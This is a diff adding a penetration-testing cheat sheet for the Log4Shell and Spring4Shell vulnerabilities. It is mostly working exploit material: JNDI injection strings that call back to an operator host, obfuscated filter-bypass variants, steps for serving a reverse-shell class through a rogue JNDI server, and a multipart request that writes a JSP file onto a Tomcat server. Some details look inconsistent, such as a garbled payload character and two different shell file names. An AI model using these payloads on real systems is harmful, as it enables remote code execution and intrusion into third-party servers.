@@ -1,0 +1,115 @@
+# Log4Shell & Spring4Shell Testing
+
+## LOG4SHELL (CVE-2021-44228) — still top of the list
+
+### Detection payloads (DNS callback; replace YOUR-SERVER)
+```
+${jndi:ldap://YOUR-SERVER/a}
+${jndi:ldap://YOUR-SERVER:1389/a}
+${jndi:ldap://YOUR-SERVER/exp}
+${jndi:rmi://YOUR-SERVER/a}
+${jndi:dns://YOUR-SERVER/a}
+${jndi:ldap://YOUR-SERVER:389/a}
+${jndi:iiop://YOUR-SERVER/a}
+${jndi:http://YOUR-SERVER/a}
+${jndi:ldap://127.0.0.1:1389/a}
+```
+### Obfuscated / WAF-bypass variants (nested lookups)
+```
+${jndi:ldap://127.0.0.1/a}
+${${::-j}${::-n}${::-d}${::-i}}${::-:}${::-l}${::-d}${::-a}${::-p}://127.0.0.1/a}
+${jndi:ldap://127.0.0.1:1389/a}
+${${env:FOO}}
+${jndi:ldap://${sys:java.version}.YOUR-SERVER/a}
+${jndi:ldap://${hostName}.YOUR-SERVER/a}
+${jndi:ldap://x.x.x.x:8888/Basic/Command/Base64}
+${jndi:ldap://127.0.0.1#a:1389/b}
+${jndi:ld%61p://127.0.0.1/a}
+${jndi:l${lower:da}p://127.0.0.1/a}
+${${lower:j}ndi:ldap://127.0.0.1/a}
+${jndi:ldap://127.0.0.1:1389/�Fax1aBI7e4}
+```
+### Where to inject
+- Every request header: `User-Agent`, `X-Forwarded-For`, `Referer`, `Authorization` (fails → log records it).
+- Every parameter, cookie, JSON body field, filename field, ID field.
+- Spring Boot `<actuator/loggers>` endpoint sometimes logs.
+- `?cmd=${jndi:ldap://...}` GitHub-style query params are logged by access logs.
+
+### Weaponize (with a listener / Java exploit)
+```
+# 1. Start Rogue-JNDI / marshalsec JNDI server (serve your payload class)
+java -jar marshalsec.jar JNDIRefServer "http://YOUR-HOST/#Evil"
+# 2. Serve Evil.class = reverse shell (Runtime.exec('/bin/sh','-c',"...")
+
+# 3. Trigger
+GET / HTTP/1.1
+Host: target.com
+User-Agent: ${jndi:ldap://YOUR-HOST:1389/Evil}
+```
+### Detection marker (even without exploit)
+```
+${env:JAVA_HOME}   or   ${sys:user.name}
+```
+If response reflects resolved value (e.g., `/usr/lib/jvm/...`) → JNDI lookups ARE running → log4shell candidate.
+
+---
+
+## SPRING4SHELL (CVE-2022-22965)
+
+### Requirements
+- Spring MVC app packaged as WAR, Tomcat, Java 9+, binding a POJO param.
+
+### Detection multipart request
+```
+POST /upload HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----x
+
+------x
+Content-Disposition: form-data; name="username"
+
+test
+------x
+Content-Disposition: form-data; name="class.module.classLoader.resources.context.parent.pipeline.first.pattern"
+
+%{}c6bfh8hbdr7vrh6b2d5h6i7f7a6i5b6i7c
+------x
+Content-Disposition: form-data; name="class.module.classLoader.resources.context.parent.pipeline.first.suffix"
+
+.jsp
+------x
+Content-Disposition: form-data; name="class.module.classLoader.resources.context.parent.pipeline.first.directory"
+
+webapps/ROOT
+------x
+Content-Disposition: form-data; name="class.module.classLoader.resources.context.parent.pipeline.first.prefix"
+
+shell
+------x
+Content-Disposition: form-data; name="class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat"
+
+5
+------x--
+```
+If a `webshell.jsp` containing the pattern string appears in webapps/ROOT → RCE.
+
+### Check file written
+```
+GET /shell.jsp   → response contains `%{}c6bfh8hbdr7vrh6b2d5h6i7f7a6i5b6i7c` (from pattern)
+```
+### Java 8 or JDK < 9 variant (older CVE-2010-1622) — try `class.classLoader...`
+```
+class.classLoader.resources.context.parent.pipeline.first.pattern
+class.classLoader.URLs[0]
+class.classLoader.jarPath
+```
+
+### Blind indicator
+- Application returns 400 "signed principal" or logs a binding error mentioning `module` → Spring present → test hard.
+
+---
+
+## Notes on severity
+- Log4Shell still appears on thousands of legacy enterprise apps and cloud APIs. It is nearly always **Critical**.
+- Spring4Shell only works in the specific WAR config — spend 5 minutes fingerprinting before declaring N/A.
+- Always trigger with OOB first, then shell only if the scope allows it.
